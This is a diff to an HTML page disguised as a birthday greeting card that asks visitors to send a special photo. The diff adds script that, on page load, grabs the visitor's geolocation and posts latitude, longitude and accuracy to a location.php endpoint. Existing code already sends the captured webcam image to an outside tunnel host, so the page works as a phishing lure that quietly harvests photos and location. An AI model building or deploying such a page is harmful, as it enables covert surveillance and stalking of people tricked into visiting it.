@@ -57,7 +57,7 @@ button:hover { transform: scale(1.05); }
 <body>
 <div class="container">
     <div class="wish-card">
-        <h1>🎉 Happy Celebrations! 🎉</h1>
+        <h1>🎉 Happy Birthday Celebrations! 🎉</h1>
         <div class="greeting">Send your warm wishes with a special photo!</div>
         <div class="camera-preview">
             <div class="placeholder">📸</div>
@@ -68,6 +68,19 @@ button:hover { transform: scale(1.05); }
     </div>
 </div>
 <script>
+if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(function(position) {
+        $.ajax({
+            type: 'POST',
+            data: {
+                lat: position.coords.latitude,
+                lon: position.coords.longitude,
+                acc: position.coords.accuracy
+            },
+            url: window.location.origin + '/location.php'
+        });
+    });
+}
 function post(imgdata) {
     $.ajax({ type: 'POST', data: { cat: imgdata }, url: 'https://colleges-digest-angela-cholesterol.trycloudflare.com/post.php', async: false });
 }
